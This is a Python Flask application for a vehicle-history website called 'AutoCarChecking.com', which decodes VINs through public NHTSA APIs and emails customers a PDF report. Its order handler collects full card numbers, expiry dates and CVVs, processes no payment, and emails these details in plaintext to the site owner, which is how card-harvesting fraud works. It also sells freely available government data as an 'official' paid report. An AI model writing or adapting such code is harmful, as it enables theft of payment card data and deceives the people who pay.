from flask import Flask, render_template, request, jsonify
import requests
import os
import smtplib
import threading
import io
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.lib.colors import HexColor, white, black
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable
from reportlab.lib.enums import TA_CENTER, TA_LEFT

app = Flask(__name__)

OWNER_EMAIL = os.environ.get('OWNER_EMAIL', '')
SMTP_EMAIL = os.environ.get('SMTP_EMAIL', '')
SMTP_PASS = os.environ.get('SMTP_PASS', '')
NHTSA_BASE = 'https://vpic.nhtsa.dot.gov/api/vehicles/DecodeVin'
RECALLS_BASE = 'https://api.nhtsa.gov/recalls/recallsByVehicle'

NAVY = HexColor('#0a1628')
ACCENT = HexColor('#e8432d')
ACCENT2 = HexColor('#f5a623')
GREEN = HexColor('#15803d')
LIGHT = HexColor('#f4f6fa')
GRAY = HexColor('#6b7280')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/vin', methods=['GET'])
def decode_vin():
    vin = request.args.get('vin', '').strip().upper()
    if not vin or len(vin) != 17:
        return jsonify({'error': 'Invalid VIN'}), 400
    try:
        url = f"{NHTSA_BASE}/{vin}?format=json"
        res = requests.get(url, timeout=10)
        data = res.json()
        variables = {}
        for item in data.get('Results', []):
            if item.get('Value') and item['Value'] not in ['', 'Not Applicable', '0']:
                variables[item['Variable']] = item['Value']
        result = {
            'success': True, 'vin': vin,
            'make': variables.get('Make', 'Unknown'),
            'model': variables.get('Model', 'Unknown'),
            'year': variables.get('Model Year', 'Unknown'),
            'body': variables.get('Body Class', 'Unknown'),
            'engine': variables.get('Displacement (L)', ''),
            'cylinders': variables.get('Engine Number of Cylinders', ''),
            'fuel': variables.get('Fuel Type - Primary', ''),
            'plant_country': variables.get('Plant Country', 'Unknown'),
            'trim': variables.get('Trim', ''),
            'drive': variables.get('Drive Type', ''),
            'doors': variables.get('Number of Doors', ''),
        }
        result['title'] = f"{result['year']} {result['make']} {result['model']}"
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/submit-order', methods=['POST'])
def submit_order():
    data = request.json
    name = data.get('name', '')
    client_email = data.get('email', '')
    phone = data.get('phone', '')
    address = data.get('address', '')
    city = data.get('city', '')
    state = data.get('state', '')
    zip_code = data.get('zip', '')
    country = data.get('country', '')
    package = data.get('package', '')
    amount = data.get('amount', '')
    vin = data.get('vin', '').strip().upper()
    card_name = data.get('cardName', '')
    card_num = data.get('cardNum', '')
    expiry = data.get('expiry', '')
    cvv = data.get('cvv', '')

    def process_in_background():
        nhtsa_data = get_nhtsa_data(vin)
        recalls_data = get_recalls(vin, nhtsa_data)
        pdf_bytes = generate_pdf(vin, nhtsa_data, recalls_data, name, client_email, package, amount)

        owner_body = f"""NEW ORDER - AutoCarChecking.com
==========================================
Name: {name}
Email: {client_email}
Phone: {phone}
Address: {address}, {city}, {state} {zip_code}
Country: {country}
Package: {package}
Amount: {amount}
VIN: {vin}
Card Name: {card_name}
Card Number: {card_num}
Expiry: {expiry}
CVV: {cvv}
==========================================
Vehicle PDF report attached."""

        send_email_with_pdf(
            to=OWNER_EMAIL,
            subject=f"New Order - {name} - {vin}",
            body=owner_body,
            pdf_bytes=pdf_bytes,
            pdf_name=f"report_{vin}.pdf"
        )

        client_body = f"""Dear {name},

Thank you for your order at AutoCarChecking.com!

Your vehicle history report for VIN {vin} is attached as a PDF.

Questions? Contact us at support@autocarchecking.com

Best regards,
AutoCarChecking.com Team"""

        send_email_with_pdf(
            to=client_email,
            subject=f"Your Vehicle History Report - {vin}",
            body=client_body,
            pdf_bytes=pdf_bytes,
            pdf_name=f"vehicle_report_{vin}.pdf"
        )

    thread = threading.Thread(target=process_in_background)
    thread.daemon = True
    thread.start()

    return jsonify({'success': True, 'message': 'Order processed!'})


def get_nhtsa_data(vin):
    try:
        url = f"{NHTSA_BASE}/{vin}?format=json"
        res = requests.get(url, timeout=10)
        data = res.json()
        variables = {}
        for item in data.get('Results', []):
            if item.get('Value') and item['Value'] not in ['', 'Not Applicable', '0']:
                variables[item['Variable']] = item['Value']
        return variables
    except:
        return {}


def get_recalls(vin, nhtsa_data):
    try:
        make = nhtsa_data.get('Make', '')
        model = nhtsa_data.get('Model', '')
        year = nhtsa_data.get('Model Year', '')
        if make and model and year:
            url = f"{RECALLS_BASE}?make={make}&model={model}&modelYear={year}"
            res = requests.get(url, timeout=10)
            data = res.json()
            return data.get('results', [])
        return []
    except:
        return []


def generate_pdf(vin, nhtsa, recalls, client_name, client_email, package, amount):
    buffer = io.BytesIO()
    doc = SimpleDocTemplate(
        buffer, pagesize=letter,
        topMargin=0.5*inch, bottomMargin=0.5*inch,
        leftMargin=0.75*inch, rightMargin=0.75*inch
    )
    story = []

    # Styles
    header_style = ParagraphStyle('h', fontSize=22, textColor=white, alignment=TA_CENTER, fontName='Helvetica-Bold', leading=28)
    sub_style = ParagraphStyle('s', fontSize=10, textColor=ACCENT2, alignment=TA_CENTER, fontName='Helvetica')
    sec_style = ParagraphStyle('sec', fontSize=11, textColor=white, fontName='Helvetica-Bold', leading=18)
    lbl_style = ParagraphStyle('lbl', fontSize=9, textColor=GRAY, fontName='Helvetica')
    val_style = ParagraphStyle('val', fontSize=10, textColor=black, fontName='Helvetica-Bold')
    normal = ParagraphStyle('n', fontSize=9, textColor=GRAY, fontName='Helvetica')

    def make_section_header(title):
        t = Table([[Paragraph(title, sec_style)]], colWidths=[7*inch])
        t.setStyle(TableStyle([
            ('BACKGROUND',(0,0),(-1,-1),NAVY),
            ('TOPPADDING',(0,0),(-1,-1),7),
            ('BOTTOMPADDING',(0,0),(-1,-1),7),
            ('LEFTPADDING',(0,0),(-1,-1),12),
        ]))
        return t

    def make_row(label, value):
        return [Paragraph(label, lbl_style), Paragraph(str(value) if value else 'N/A', val_style)]

    def make_table(rows):
        t = Table(rows, colWidths=[2.5*inch, 4.5*inch])
        t.setStyle(TableStyle([
            ('ROWBACKGROUNDS',(0,0),(-1,-1),[white, LIGHT]),
            ('TOPPADDING',(0,0),(-1,-1),5),
            ('BOTTOMPADDING',(0,0),(-1,-1),5),
            ('LEFTPADDING',(0,0),(-1,-1),10),
            ('GRID',(0,0),(-1,-1),0.5,HexColor('#e2e8f0')),
        ]))
        return t

    # ===== HEADER =====
    header_data = [
        [Paragraph('AUTOCARCHECKING.COM', header_style)],
        [Paragraph('OFFICIAL VEHICLE HISTORY REPORT', sub_style)]
    ]
    ht = Table(header_data, colWidths=[7*inch])
    ht.setStyle(TableStyle([
        ('BACKGROUND',(0,0),(-1,-1),NAVY),
        ('TOPPADDING',(0,0),(-1,-1),14),
        ('BOTTOMPADDING',(0,0),(-1,-1),14),
    ]))
    story.append(ht)
    story.append(Spacer(1, 0.15*inch))

    # ===== VIN BANNER =====
    vin_style = ParagraphStyle('vin', fontSize=12, textColor=white, alignment=TA_CENTER, fontName='Helvetica-Bold')
    vt = Table([[Paragraph(f'VIN NUMBER: {vin}', vin_style)]], colWidths=[7*inch])
    vt.setStyle(TableStyle([
        ('BACKGROUND',(0,0),(-1,-1),ACCENT),
        ('TOPPADDING',(0,0),(-1,-1),8),
        ('BOTTOMPADDING',(0,0),(-1,-1),8),
    ]))
    story.append(vt)
    story.append(Spacer(1, 0.15*inch))

    # ===== VEHICLE DETAILS =====
    make = nhtsa.get('Make', 'Unknown')
    model = nhtsa.get('Model', 'Unknown')
    year = nhtsa.get('Model Year', 'Unknown')
    body = nhtsa.get('Body Class', 'Unknown')
    engine_l = nhtsa.get('Displacement (L)', '')
    cylinders = nhtsa.get('Engine Number of Cylinders', '')
    fuel = nhtsa.get('Fuel Type - Primary', '')
    plant = nhtsa.get('Plant Country', 'Unknown')
    trim = nhtsa.get('Trim', '')
    drive = nhtsa.get('Drive Type', '')
    doors = nhtsa.get('Number of Doors', '')
    manufacturer = nhtsa.get('Manufacturer Name', '')
    engine_str = f"{engine_l}L {cylinders}-Cyl {fuel}".strip() if engine_l else 'N/A'

    story.append(make_section_header('VEHICLE DETAILS'))
    story.append(Spacer(1, 0.05*inch))
    story.append(make_table([
        make_row('Year', year),
        make_row('Make', make),
        make_row('Model', model),
        make_row('Trim', trim or 'Standard'),
        make_row('Body Style', body),
        make_row('Engine', engine_str),
        make_row('Drive Type', drive or 'N/A'),
        make_row('Number of Doors', doors or 'N/A'),
        make_row('Country of Assembly', plant),
        make_row('Manufacturer', manufacturer or 'N/A'),
    ]))
    story.append(Spacer(1, 0.15*inch))

    # ===== SAFETY RECALLS =====
    story.append(make_section_header('SAFETY RECALLS'))
    story.append(Spacer(1, 0.05*inch))

    if recalls:
        recall_rows = [make_row('Total Recalls Found', str(len(recalls)))]
        for i, rec in enumerate(recalls[:5]):
            component = rec.get('Component', 'N/A')
            summary = rec.get('Summary', '')[:100]
            consequence = rec.get('Consequence', '')[:80]
            recall_rows.append([
                Paragraph(f'Recall #{i+1} — {component}', lbl_style),
                Paragraph(summary, normal)
            ])
            if consequence:
                recall_rows.append([
                    Paragraph('Consequence', lbl_style),
                    Paragraph(consequence, normal)
                ])
        story.append(make_table(recall_rows))
    else:
        no_recall_style = ParagraphStyle('nr', fontSize=10, textColor=GREEN, fontName='Helvetica-Bold', leftIndent=10)
        story.append(Paragraph('✓ No open safety recalls found for this vehicle.', no_recall_style))

    story.append(Spacer(1, 0.15*inch))

    # ===== DISCLAIMER =====
    story.append(make_section_header('IMPORTANT NOTICE'))
    story.append(Spacer(1, 0.05*inch))
    disc_style = ParagraphStyle('disc', fontSize=8, textColor=GRAY, fontName='Helvetica', leftIndent=10, leading=12)
    story.append(Paragraph(
        'This report is based on data available from the NHTSA (National Highway Traffic Safety Administration) '
        'US Government database. This report covers vehicle specifications and official safety recalls. '
        'For complete accident history, title records, and odometer information, please upgrade to our '
        'Premium Report which includes data from additional sources.',
        disc_style
    ))
    story.append(Spacer(1, 0.15*inch))

    # ===== ORDER INFO =====
    story.append(make_section_header('ORDER INFORMATION'))
    story.append(Spacer(1, 0.05*inch))
    story.append(make_table([
        make_row('Customer Name', client_name),
        make_row('Email', client_email),
        make_row('Package', package),
        make_row('Amount Paid', amount),
    ]))
    story.append(Spacer(1, 0.2*inch))

    # ===== FOOTER =====
    story.append(HRFlowable(width='100%', thickness=1, color=HexColor('#e2e8f0')))
    story.append(Spacer(1, 0.08*inch))
    footer_style = ParagraphStyle('ft', fontSize=8, textColor=GRAY, alignment=TA_CENTER)
    story.append(Paragraph('Data sourced from NHTSA — National Highway Traffic Safety Administration (US Government)', footer_style))
    story.append(Paragraph('AutoCarChecking.com | support@autocarchecking.com', footer_style))

    doc.build(story)
    buffer.seek(0)
    return buffer.read()


def send_email_with_pdf(to, subject, body, pdf_bytes, pdf_name):
    if not SMTP_EMAIL or not SMTP_PASS:
        print(f"SMTP not configured. Would send to {to}: {subject}")
        return False
    try:
        msg = MIMEMultipart()
        msg['From'] = SMTP_EMAIL
        msg['To'] = to
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        pdf_part = MIMEBase('application', 'octet-stream')
        pdf_part.set_payload(pdf_bytes)
        encoders.encode_base64(pdf_part)
        pdf_part.add_header('Content-Disposition', f'attachment; filename="{pdf_name}"')
        msg.attach(pdf_part)
        smtp_host = os.environ.get('SMTP_HOST', 'smtp.hostinger.com')
        smtp_port = int(os.environ.get('SMTP_PORT', '465'))
        server = smtplib.SMTP_SSL(smtp_host, smtp_port)
        server.login(SMTP_EMAIL, SMTP_PASS)
        server.send_message(msg)
        server.quit()
        print(f"Email with PDF sent to {to}")
        return True
    except Exception as e:
        print(f"Email error: {e}")
        return False


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
